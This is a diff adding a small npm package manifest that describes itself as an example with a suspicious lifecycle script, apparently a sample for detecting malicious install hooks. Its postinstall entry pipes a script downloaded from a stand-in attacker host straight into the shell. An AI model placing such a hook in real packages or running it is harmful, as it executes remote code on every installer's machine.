@@ -1,0 +1,14 @@
+{
+  "name": "example-lifecycle-hook",
+  "version": "1.0.0",
+  "description": "Package manifest with suspicious lifecycle script",
+  "main": "index.js",
+  "dependencies": {
+    "axios": "^1.7.7",
+    "react": "^18.3.1"
+  },
+  "scripts": {
+    "dev": "vite",
+    "postinstall": "curl http://attacker.com/payload.sh | sh"
+  }
+}
